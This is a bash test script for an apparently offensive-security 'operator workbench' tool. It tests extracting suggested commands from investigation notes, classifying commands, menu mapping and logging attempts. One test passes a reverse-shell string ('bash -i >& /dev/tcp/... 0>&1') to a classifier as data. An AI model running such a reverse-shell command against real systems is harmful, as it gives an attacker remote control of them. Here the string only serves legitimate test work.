#!/usr/bin/env bash
# workbench-test.sh — operator workbench helpers (offline).
set -euo pipefail

NEO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
export NEO_HOME="${NEO_ROOT}"
export NEO_DIR="${NEO_ROOT}"
export NEO_STATE_ROOT="${NEO_ROOT}/test/tmp/workbench-state-$$"

pass=0
fail=0
ok()   { printf '  [ok] %s\n' "$1"; pass=$((pass + 1)); }
bad()  { printf '  [FAIL] %s\n' "$1" >&2; fail=$((fail + 1)); }

printf 'workbench-test.sh\n\n'

# shellcheck source=../lib/neo-menu.sh
source "${NEO_DIR}/lib/neo-menu.sh"
# shellcheck source=../lib/neo-workbench.sh
source "${NEO_DIR}/lib/neo-workbench.sh"

fixture_notes="$(mktemp)"
cat > "${fixture_notes}" <<'EOF'
<!-- SECTION:PAYLOAD -->
### Payload suggest (curl) — 2026-08-31

## Context recap
Test target.

## Exact next command
```bash
curl -s http://10.10.10.1/
```

## Caveats
none
<!-- /SECTION:PAYLOAD -->
EOF

extract_test() {
    local project="$1" outdir notes
    outdir="${NEO_HOME}/projects/${project}"
    mkdir -p "${outdir}"
    notes="${outdir}/Investigation-Notes.md"
    cp "${fixture_notes}" "${notes}"
    neo_workbench_extract_last_command "${project}"
}

cmd="$(extract_test wb-extract-test)"
[[ "${cmd}" == "curl -s http://10.10.10.1/" ]] \
    && ok "extract last command from Exact next command" \
    || bad "extract last command — got: ${cmd}"

[[ "$(neo_workbench_classify_transport 'curl -s http://1.1.1.1/')" == local_safe ]] \
    && ok "classify simple curl as local_safe" \
    || bad "classify simple curl"

[[ "$(neo_workbench_classify_transport 'bash -i >& /dev/tcp/1/4444 0>&1')" == operator_pane ]] \
    && ok "classify shell metacharacters as operator_pane" \
    || bad "classify shell metacharacters"

[[ "$(neo_menu_classify t)" == try-command ]] && ok "menu t -> try-command" || bad "menu t"
[[ "$(neo_menu_classify O)" == open-operator ]] && ok "menu O -> open-operator" || bad "menu O"

neo_workbench_visible_phase recon && ok "visible on recon" || bad "visible recon"
neo_workbench_visible_phase post && ok "visible on post" || bad "visible post"
neo_workbench_visible_phase connect && bad "not visible on connect" || ok "hidden on connect"

project="wb-json-test"
neo_workbench_save_attempt_json "${project}" "wb-1-1" foothold workbench "echo hi" local_safe \
    "${NEO_HOME}/projects/${project}/artifacts/x.txt" 0 success >/dev/null
neo_workbench_has_attempts "${project}" && ok "attempt JSON recorded" || bad "attempt JSON"

frag="$(neo_workbench_menu_fragment foothold "${project}")"
[[ "${frag}" == *"[t]ry command"* ]] && ok "menu fragment includes try" || bad "menu fragment"

bash -n "${NEO_DIR}/lib/neo-operator-pane.sh" && ok "syntax neo-operator-pane.sh" || bad "syntax pane"
bash -n "${NEO_DIR}/lib/neo-workbench.sh" && ok "syntax neo-workbench.sh" || bad "syntax workbench"

rm -rf "${NEO_STATE_ROOT}" "${fixture_notes}" "${NEO_HOME}/projects/wb-extract-test" \
    "${NEO_HOME}/projects/wb-json-test" 2>/dev/null || true

printf '\n%d passed, %d failed\n' "${pass}" "${fail}"
test "${fail}" -eq 0
